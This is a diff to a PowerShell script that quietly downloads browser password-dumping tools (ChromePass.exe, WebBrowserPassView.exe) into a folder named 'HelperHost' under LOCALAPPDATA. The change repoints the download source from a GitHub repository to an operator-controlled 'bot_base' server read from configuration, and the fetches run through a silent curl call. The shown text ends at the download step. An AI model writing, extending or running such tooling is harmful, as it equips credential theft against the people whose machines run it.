@@ -1,11 +1,15 @@
 $ErrorActionPreference = 'Continue'
 $toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
 New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
-$sha = 'main'
-try {
-  $cfg = Join-Path $env:LOCALAPPDATA 'HelperHost\config.json'
-} catch {}
-$base = "https://raw.githubusercontent.com/lilygopro/AgentSHE/$sha/tools/windows"
+$base = $env:AGENTSHE_FILES
+if (-not $base) {
+  try {
+    $cfg = Get-Content (Join-Path $env:LOCALAPPDATA 'HelperHost\config.json') -Raw | ConvertFrom-Json
+    if ($cfg.bot_base) { $base = ($cfg.bot_base.TrimEnd('/') + '/files') }
+  } catch {}
+}
+if (-not $base) { throw 'AGENTSHE_FILES / bot_base manquant' }
+$base = $base.TrimEnd('/')
 $tools = @(
   @{ id = 'chromepass'; leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' },
   @{ id = 'webbrowser'; leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' },
@@ -21,8 +25,8 @@ $files = @()
 foreach ($t in $tools) {
   try {
     $dest = Join-Path $toolsDir $t.leaf
-    $url = "$base/$($t.rel)"
-    $url32 = if ($t.rel32) { "$base/$($t.rel32)" } else { $url }
+    $url = "$base/tools/$($t.rel)"
+    $url32 = if ($t.rel32) { "$base/tools/$($t.rel32)" } else { $url }
     if (-not [Environment]::Is64BitOperatingSystem) { $url = $url32 }
     if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
       & curl.exe -fsSL $url -o $dest 2>$null
